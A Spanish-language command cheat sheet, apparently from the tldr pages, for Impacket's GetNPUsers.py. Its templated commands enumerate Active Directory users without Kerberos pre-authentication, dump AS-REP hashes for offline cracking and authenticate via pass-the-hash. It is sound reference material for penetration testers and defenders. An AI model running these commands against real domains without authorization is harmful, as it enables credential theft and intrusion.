# GetNPUsers.py

> Enumera las cuentas de Active Directory con la autenticación previa de Kerberos desactivada, que pueden ser susceptibles a ataques AS-REP roasting.
> Parte del paquete Impacket.
> Más información: <https://github.com/fortra/impacket>.

- Enumera los usuarios con la autenticación previa de Kerberos desactivada (enumeración anónima por defecto):

`GetNPUsers.py {{dominio}}/ -usersfile {{ruta/a/la/lista_de_usuarios}} -dc-ip {{ip_del_controlador_de_dominio}} -no-pass`

- Realiza roasting AS-REP y vuelca hash descifrables para descifrados sin conexión:

`GetNPUsers.py {{dominio}}/ -usersfile {{ruta/a/la/lista_de_usuarios}} -dc-ip {{ip_del_controlador_de_dominio}} -no-pass -request`

- Autentica con credenciales válidas (si el enlace anónimo está desactivado):

`GetNPUsers.py {{dominio}}/{{nombre_de_usuario}}:{{contraseña}} -usersfile {{ruta/a/la/lista_de_usuarios}} -dc-ip {{ip_del_controlador_de_dominio}}`

- Utiliza la autenticación pass-the-hash en lugar de una contraseña:

`GetNPUsers.py {{dominio}}/{{nombre_de_usuario}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{ruta/a/la/lista_de_usuarios}} -dc-ip {{ip_del_controlador_de_dominio}}`

- Guarda la salida en un archivo para su posterior análisis:

`GetNPUsers.py {{dominio}}/ -usersfile {{ruta/a/lista_de_usuarios}} -dc-ip {{ip_del_controlador_de_dominio}} -request > {{ruta/a/salida.txt}}`
